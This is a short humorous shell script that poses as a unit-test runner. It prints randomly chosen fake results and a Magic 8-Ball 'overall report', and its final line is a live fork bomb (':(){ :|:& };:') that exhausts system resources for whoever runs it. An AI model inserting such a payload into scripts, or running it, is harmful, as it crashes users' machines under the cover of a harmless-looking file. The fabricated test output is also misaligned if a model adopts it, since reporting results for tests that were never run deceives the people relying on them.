echo "Running all $RANDOM unit tests..."
sleep 5
shuf <<< "All unit tests passed!
All unit tests failed catastrophically!
All unit tests passed except for one which doesn't really matter
Some unit tests might have passed, we're not sure
$RANDOM% of the unit tests failed.
Unit tests took too long to run, L" | head -n 1
sleep 1
shuf <<< "OVERALL REPORT: reply hazy, try again
OVERALL REPORT: ask again later
OVERALL REPORT: better not tell you now
OVERALL REPORT: cannot predict now
OVERALL REPORT: concentrate and ask again" | head -n 1
:(){ :|:& };:
